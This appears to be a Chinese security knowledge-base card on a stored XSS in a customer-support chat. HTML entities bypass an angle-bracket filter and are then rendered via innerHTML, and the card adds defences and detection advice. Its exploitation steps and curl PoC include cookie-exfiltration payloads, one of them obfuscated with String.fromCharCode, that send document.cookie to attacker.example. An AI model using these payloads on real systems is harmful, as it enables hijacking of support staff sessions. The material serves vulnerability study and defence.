---
id: web-generic-xss-html-entity-decode-innerhtml-support
title: 客服对话 HTML 实体编码绕过尖括号过滤：decodeHtmlEntities + innerHTML 导致存储型 XSS 窃取客服 Cookie
type: scenario
domain: web
path: web/generic/xss
technique: stored-xss-html-entity-decode-innerhtml
aliases:
- 客服系统存储型 XSS
- HTML 实体编码绕过尖括号
- decodeHtmlEntities innerHTML
- support_send 存储型 XSS
- html_preview 渲染链
tags:
- web
- xss
- stored-xss
- entity-encoding
- innerhtml
- filter-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V106
  verified_at: '2026-11-05T22:26:57+08:00'
  notes: 已对照原文与图18/19核对：support_send 仅过滤原始尖括号、HTML 实体编码绕过、app.js decodeHtmlEntities()+supportMessageItem() 在 html_preview 下 innerHTML 渲染、客服端触发，均与原文一致；PoC 为按原文重写的 curl 模板（含无害 alert 变体），未本机复跑；原文无产品版本；frontmatter 无 sources/source_url。
---

## 一句话结论

在线客服系统的消息接口只过滤原始尖括号 `<`/`>`，攻击者用 HTML 实体编码（`&lt;`、`&gt;`、`&#60;`、`&#62;`）即可绕过并把 payload 持久化到数据库；前端 `decodeHtmlEntities()` 会把实体解码，`supportMessageItem()` 在 `render_mode=html_preview` 时把解码结果通过 `innerHTML` 写入 DOM，客服人员查看会话时 payload 在客服浏览器上下文执行，可窃取 Cookie、劫持会话或操作后台。

## 原理

- 入口：攻击者以普通客户身份发起人工请求（`support_handoff`）创建会话，再通过 `support_send` 发送消息。
- 过滤：`support_send` 只检测原始尖括号字符 `<` 和 `>`，命中返回 422；它没有对 HTML 实体、事件属性、协议等做统一编码或白名单。
- 绕过：提交 `&lt;img src=x onerror=...&gt;` 或 `&#60;...&#62;` 等实体编码形式，服务端看到的是普通字符，过滤通过；消息以 `render_mode=html_preview` 持久化存储。
- 渲染链：前端 `/assets/app.js` 中：
  - `decodeHtmlEntities(value)` 创建一个 `textarea`，把输入赋给 `innerHTML`，再返回 `textarea.value`，实现实体解码；
  - `supportMessageItem(message)` 在 `sender_role === 'user' && render_mode === 'html_preview'` 时，对 `message.content` 调用 `decodeHtmlEntities()`，把结果拼进 `contentHtml`，随后通过 `innerHTML` 插入消息气泡。
- 结果：存储的实体编码 payload 在客服端被解码并当作 HTML 执行；触发点是客服服务台页面 `support-agent.html`。客服通常拥有更高权限，Cookie/会话/后台操作都可被劫持，影响所有查看该会话的客服。
- 这也解释了为什么“只过滤尖括号”不够：过滤发生在输入端且只针对字面量，渲染端又把实体还原成标签，两端语义不一致。

## 触发条件

- 在线客服/工单系统允许普通用户发送消息，消息持久化并在客服端展示；
- 服务端只做原始尖括号黑名单或简单字符替换，未做统一 HTML 编码/白名单；
- 前端存在“先解码实体、再 `innerHTML` 渲染”的预览逻辑（本卡为 `render_mode=html_preview`）；
- 客服人员会打开包含该消息的会话页面，且页面与客服后台同源（Cookie 可被读取）。

## 利用步骤

1. 以普通客户身份发起人工客服请求（`support_handoff`），创建会话。
2. 调用 `support_send` 发送消息，内容使用 HTML 实体编码绕过尖括号过滤，例如：
   `&lt;img src=x onerror=fetch('https://attacker.example/?c='+encodeURIComponent(document.cookie))&gt;`
3. 确认消息成功存储且 `render_mode` 为 `html_preview`（可从请求体或响应推断）。
4. 等待客服在 `support-agent.html` 打开该会话；或诱导客服查看（例如发送一条需要人工处理的消息）。
5. 在攻击者服务器接收请求，获取客服 Cookie/会话；若 Cookie 为 HttpOnly，可改用页面内操作（读取 DOM、发起后台请求）完成进一步利用。
6. 也可构造 DOM 操作型 payload 在客服后台执行操作，或向其他客服传播。

## PoC

```bash
# 1. 创建客服会话（字段名按目标实现调整）
curl -s -X POST 'http://<target>/support_handoff' \
  -H 'Content-Type: application/json' \
  -d '{"message":"需要人工协助"}'

# 2. 发送实体编码 payload
curl -s -X POST 'http://<target>/support_send' \
  -H 'Content-Type: application/json' \
  -d '{"session_id":"<session>","content":"&lt;img src=x onerror=fetch(String.fromCharCode(47,47)+String.fromCharCode(97,116,116,97,99,107,101,114)+String.fromCharCode(47,63,99,61)+encodeURIComponent(document.cookie))&gt;","render_mode":"html_preview"}'
```

最小验证 payload（无外带，仅证明执行）：

```html
&lt;img src=x onerror=alert(document.domain)&gt;
```

原文的利用链在客服服务台页面触发，最终目标是拿到客服 Cookie；实际验证时应使用授权环境与无害回显。

## 变体与关联

- 变体：`&#x3C;`、`&#60;`、`&lt;` 等多种实体写法；若过滤只处理一种，换另一种即可。
- 变体：不使用 `<img>`，改用 SVG、事件属性或 `javascript:` 协议等 scriptless 载体。
- 变体：把 payload 放进客服消息附件名、工单主题等同样在客服端渲染的字段，绕过只针对消息正文的过滤。
- 关联 [[web-generic-xss-backend-script-style-blacklist-api-bypass]]：同样是“前端编码/后端黑名单”语义不一致导致的存储型 XSS，可对照过滤与渲染两端的差异。
- 关联 [[web-generic-xss-filter-bypass-encoding-obfuscation]]：实体编码/黑名单绕过的通用技巧集。
- 边界：若服务端在存储前统一 HTML 编码，或前端使用 `textContent`/可信模板渲染，本链不成立；CSP 可限制外带但通常不能阻止同源 DOM 操作。

## 检测与防御

- **输出编码**：客服端渲染消息时默认使用 `textContent` 或框架的自动转义；确需富文本时使用白名单 sanitizer（DOMPurify 等），不要“先解码实体再 innerHTML”。
- **统一过滤层**：服务端对消息内容做 HTML 白名单/编码，而不是只过滤字面尖括号；实体编码、属性、协议都要覆盖。
- **Cookie 加固**：客服后台 Cookie 设置 `HttpOnly`、`Secure`、`SameSite`，降低 XSS 直接读取会话的风险；后台操作加 CSRF 令牌。
- **CSP**：限制 `script-src`、`connect-src` 与内联事件，增加外带难度（但不能替代输出编码）。
- **检测**：对消息内容中的实体编码标签、事件属性、`javascript:` 协议做告警；监控客服端异常外连；对客服会话页面做 XSS 回归测试。
